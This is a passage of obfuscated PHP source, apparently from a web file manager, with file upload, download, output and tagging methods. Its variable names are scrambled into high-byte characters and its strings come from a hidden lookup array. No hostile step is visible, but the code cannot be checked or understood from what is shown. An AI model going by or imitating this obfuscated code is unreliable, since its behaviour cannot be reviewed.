(!$öÙãŠ·Ú) { return array(); } return $this->model->listAll($‘“Ì‚Š); } public function getContent($°Á£Á¢¥) { return $this->model->getContent($°Á£Á¢¥); } public function setContent($”£ØÑÓ, $‹ØçÕ¾± = '') { return $this->model->setContent($”£ØÑÓ, $‹ØçÕ¾±); } public function fileSubstr($î±ü„‹, $øªç‡Í­, $Èì¼ú¶) { return $this->model->fileSubstr($î±ü„‹, $øªç‡Í­, $Èì¼ú¶); } public function download($¾ëÉ®¾â, $¢›õ¤ö = '') { $É±‘ùÄ» = get_path_father($¢›õ¤ö); $íò™ï»¯ = get_path_this($¢›õ¤ö); $ØĞíŸÏ = $this->model->fileInfoGet($¾ëÉ®¾â); $îŸõ´ËŸ = IO::copy($ØĞíŸÏ[$_SERVER[íïàËŸë][87]], $É±‘ùÄ», !1, $íò™ï»¯); return $îŸõ´ËŸ; } public function setModifyTime($¯„£ö›é, $ÉÈÓ‡¥Æ = '') { $¹Åâé =& $_SERVER[íïàËŸë]; if (!$¯„£ö›é) { return; } $this->model->where(array($¹Åâé[491] => $¯„£ö›é))->save(array($¹Åâé[88] => $ÉÈÓ‡¥Æ)); } public function upload($Ş·–, $éå˜ŠİÛ, $•«ÎÁŠÙ = false, $ôÎÁºÑ‹ = REPEAT_REPLACE) { $Á¤¼áÉ• =& $_SERVER[íïàËŸë]; $„üú±—× = $this->parse($Ş·–); $°‰¸ÚÚ¢ = $this->model->addFile($„üú±—×[$Á¤¼áÉ•[475]], $éå˜ŠİÛ, $„üú±—×[$Á¤¼áÉ•[87]], $•«ÎÁŠÙ, $ôÎÁºÑ‹); return $this->getPathOuter($°‰¸ÚÚ¢); } public function uploadFileByID($Ôì‘ââ, $–à¡À¼¯, $‡ªò) { $¯¯¬ƒ¬ =& $_SERVER[íïàËŸë]; $õè¿¦¬ = $this->parse($Ôì‘ââ); $°û®İãş = $this->model->addFileByFileID($õè¿¦¬[$¯¯¬ƒ¬[475]], $–à¡À¼¯, $õè¿¦¬[$¯¯¬ƒ¬[87]], $‡ªò); return $this->getPathOuter($°û®İãş); } public function addFileByRemote($±ÓÙ¬, $ƒÓ–Åµ, $ÃÕÄ¾™À = array(), $÷ÆÒúòó = '', $¿Ú¨‰) { $ÌÎà¼‹ˆ =& $_SERVER[íïàËŸë]; $É•‘ŠÄ = $this->parse($±ÓÙ¬); $÷ÆÒúòó = empty($÷ÆÒúòó) ? $É•‘ŠÄ[$ÌÎà¼‹ˆ[87]] : $÷ÆÒúòó; $†—±°Âõ = $this->model->addFileByRemote($É•‘ŠÄ[$ÌÎà¼‹ˆ[475]], $ƒÓ–Åµ, $÷ÆÒúòó, $ÃÕÄ¾™À, $¿Ú¨‰); return $this->getPathOuter($†—±°Âõ); } public function uploadLink($ë‰ê†ûØ, $ò¿éèç™ = 0) { $Ã–ÔŒìø =& $_SERVER[íïàËŸë]; $¶ûÏ½ÇÈ = $this->parse($ë‰ê†ûØ); $Ûßò”‘ = _get($GLOBALS[$Ã–ÔŒìø[7]], $Ã–ÔŒìø[1430]); $ü®³‘©¨ = _get($GLOBALS[$Ã–ÔŒìø[7]], $Ã–ÔŒìø[1431]); $ë‰ê†ûØ = Model($Ã–ÔŒìø[674])->createFileName($¶ûÏ½ÇÈ[$Ã–ÔŒìø[87]], $Ûßò”‘, $ü®³‘©¨); return IO::uploadLink($ë‰ê†ûØ, $ò¿éèç™); } public function fileNameAuto($•ûü™«›, $¨ÊÕ¼à‹, $Ëõşší– = REPEAT_REPLACE, $‚˜œ–×ä = false) { return $this->model->fileNameAuto($•ûü™«›, $¨ÊÕ¼à‹, $Ëõşší–, $‚˜œ–×ä); } public function fileNameExist($‰§Ò¨âõ, $ĞÆÂ«í) { return $this->model->fileNameExist($‰§Ò¨âõ, $ĞÆÂ«í); } protected function _fileOut($ñÎ—“×ú, $î¶»®×Ë = false, $Ö¢Î´ûÕ = false, $Ü²Å¾ãÃ = '', $‘¦î‰ÚÕ = false) { $Ô¯óšŠ =& $_SERVER[íïàËŸë]; $İº•ôşû = $this->model->sourceInfo($ñÎ—“×ú); if ($İº•ôşû[$Ô¯óšŠ[485]] == $Ô¯óšŠ[91]) { header($Ô¯óšŠ[1432]); die; } $È´¤™ğı = $this->model->fileInfoGet($ñÎ—“×ú); $Ü²Å¾ãÃ = $È´¤™ğı[$Ô¯óšŠ[547]] ? $È´¤™ğı[$Ô¯óšŠ[547]] : $Ü²Å¾ãÃ; $¹·¯†«µ = isset($GLOBALS[$Ô¯óšŠ[182]]) && is_array($GLOBALS[$Ô¯óšŠ[182]]) ? $GLOBALS[$Ô¯óšŠ[182]][$Ô¯óšŠ[32]] : $İº•ôşû[$Ô¯óšŠ[32]]; if ($‘¦î‰ÚÕ) { return IO::fileOutServer($È´¤™ğı[$Ô¯óšŠ[87]], $î¶»®×Ë, $¹·¯†«µ, $Ü²Å¾ãÃ); } IO::fileOut($È´¤™ğı[$Ô¯óšŠ[87]], $î¶»®×Ë, $¹·¯†«µ, $Ü²Å¾ãÃ); } public function fileOut($‚…ÜÎ‰“, $€Îæ­– = false, $°ßÇÅÖª = false, $ã•¶Øæ× = '') { $this->_fileOut($‚…ÜÎ‰“, $€Îæ­–, $°ßÇÅÖª, $ã•¶Øæ×); } public function fileOutServer($ü¿Ø¶Ëß, $ö»«Ô¨ñ = false, $ÕÊ¼é€ó = false, $†™İİ®Æ = '') { $this->_fileOut($ü¿Ø¶Ëß, $ö»«Ô¨ñ, $ÕÊ¼é€ó, $†™İİ®Æ, !0); } protected function _fileOutImage($Ş×ŒôÍ, $…Íô¤ûâ = 250) { $ƒ·•æ‚œ =& $_SERVER[íïàËŸë]; $°ÊàƒÚï = $this->model->pathInfo($Ş×ŒôÍ); if ($°ÊàƒÚï[$ƒ·•æ‚œ[485]] == $ƒ·•æ‚œ[91]) { show_json($ƒ·•æ‚œ[1433] . $Ş×ŒôÍ, !1); } $·µ°èÈç = $this->model->fileInfoGet($Ş×ŒôÍ); $°ÊàƒÚï[$ƒ·•æ‚œ[183]] = $·µ°èÈç[$ƒ·•æ‚œ[87]]; $GLOBALS[$ƒ·•æ‚œ[182]] = $°ÊàƒÚï; IO::fileOutImage($·µ°èÈç[$ƒ·•æ‚œ[87]], $…Íô¤ûâ); } public function fileOutImage($ïêŠëÜö, $æŒó¡Äø = 250) { $this->_fileOutImage($ïêŠëÜö, $æŒó¡Äø); } public function fileOutImageServer($É«òÊÊö, $¬¡˜«§Ù = 250) { $this->_fileOutImage($É«òÊÊö, $¬¡˜«§Ù); } public function link($“úöÕê, $Ô“µˆÙ  = '') { $¶¹ €ÒÛ = $this->model->fileInfoGet($“úöÕê); return IO::link($¶¹ €ÒÛ[$_SERVER[íïàËŸë][87]], $Ô“µˆÙ ); } protected function parse($íªõ°¥) { $ë–‚¿¦¦ =& $_SERVER[íïàËŸë]; if (strstr($íªõ°¥, $ë–‚¿¦¦[8]) === !1) { return array($ë–‚¿¦¦[493] => intval($íªõ°¥), $ë–‚¿¦¦[87] => $ë–‚¿¦¦[12], $ë–‚¿¦¦[1429] => array()); } $¼¼†ó¼ = explode($ë–‚¿¦¦[8], trim($íªõ°¥, $ë–‚¿¦¦[8])); if (count($¼¼†ó¼) < 2) { show_tips(clear_html($íªõ°¥) . $ë–‚¿¦¦[1434]); } return array($ë–‚¿¦¦[493] => intval($¼¼†ó¼[0]), $ë–‚¿¦¦[87] => $¼¼†ó¼[1], $ë–‚¿¦¦[1429] => array_slice($¼¼†ó¼, 1)); } } goto f¿êÙŒâÊø; DÔ·îÔÜ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($Òéêš´€) { $ÅœÖş×à =& $_SERVER[íïàËŸë]; return array($ÅœÖş×à[2095] => array($ÅœÖş×à[2509] . USER_ID, $ÅœÖş×à[2096])); } protected function listData() { $“’¶ú“ª =& $_SERVER[íïàËŸë]; $×®î‡Á¹ = array($“’¶ú“ª[1773] => USER_ID, $“’¶ú“ª[557] => array($“’¶ú“ª[2099], 0)); $ƒé—ÅĞŞ = $“’¶ú“ª[2510]; $ôÄ¸ßÙâ = $this->field($ƒé—ÅĞŞ)->where($×®î‡Á¹)->order($“’¶ú“ª[2102])->select(); return $ôÄ¸ßÙâ ? $ôÄ¸ßÙâ : array(); } protected function addToTag($Ûâ¡ú¾, $²Áš‡‹) { $¢á­—œé =& $_SERVER[íïàËŸë]; if (!Model($¢á­—œé[2246])->listData($²Áš‡‹)) { return !1; } if (is_numeric($Ûâ¡ú¾)) { $ÕÈˆ¸»Û = Model($¢á­—œé[907])->pathInfo($Ûâ¡ú¾); if (!$ÕÈˆ¸»Û) { return !1; } } else { $ÕÈˆ¸»Û = IO::infoSimple($Ûâ¡ú¾); if (!$ÕÈˆ¸»Û) { return !1; } $µ¹¤ëé = $ÕÈˆ¸»Û[$¢á­—œé[32]]; $·…‡Í€ = $ÕÈˆ¸»Û[$¢á­—œé[33]]; if (isset($ÕÈˆ¸»Û[$¢á­—œé[485]])) { $·…‡Í€ = $ÕÈˆ¸»Û[$¢á­—œé[485]] == $¢á­—œé[91] ? $¢á­—œé[78] : $¢á­—œé[230]; } } $½ãÛ¨—Ó = array($¢á­—œé[1773] => USER_ID, $¢á­—œé[557] => $²Áš‡‹, $¢á­—œé[495] => $Ûâ¡ú¾, $¢á­—œé[496] => $·…‡Í€ ? $·…‡Í€ : $¢á­—œé[490], $¢á­—œé[494] => $µ¹¤ëé ? $µ¹¤ëé : $¢á­—œé[12], $¢á­—œé[1984] => 0); if ($this->where($½ãÛ¨—Ó)->find()) { return !1; } return $this->add($½ãÛ¨—Ó); } protected function removeFromTag($®ÛÒ¬“, $‡Û­›¬ö) { $Àˆßªúï =& $_SERVER[íïàËŸë]; if (!Model($Àˆßªúï[2246])->listData($‡Û­›¬ö)) { return !1; } if (is_array($®ÛÒ¬“)) { $®ÛÒ¬“ = array($Àˆßªúï[7], $®ÛÒ¬“); } $Ò—®ÑŠ‹ = array($Àˆßªúï[1773] => USER_ID, $Àˆßªúï[557] => $‡Û­›¬ö, $Àˆßªúï[495] => $®ÛÒ¬“); return $this->where($Ò—®ÑŠ‹)->delete(); } protected function removeByTag($„á³€’·) { $ĞÜÈ«ì² =& $_SERVER[íïàËŸë]; if (!$„á³€’·) { return !1; } $¯ÑÑŸşÛ = array($ĞÜÈ«ì²[1773] => USER_ID, $ĞÜÈ«ì²[557] => $„á³€’·); return $this->where($¯ÑÑŸşÛ)->delete(); } protected function removeBySource($É™üå¹ï) { $É‰”Œşş =& $_SERVER[íïàËŸë]; if (is_array($É™üå¹ï)) { $É™üå¹ï = array($É‰”Œşş[7], $É™üå¹ï); } $®ıí‹’ = array($É‰”Œşş[1773] => USER_ID, $É‰”Œşş[557] => array($É‰”Œşş[1103], 0), $É‰”Œşş[495] => $É™üå¹ï); return $this->where($®ıí‹’)->delete(); } }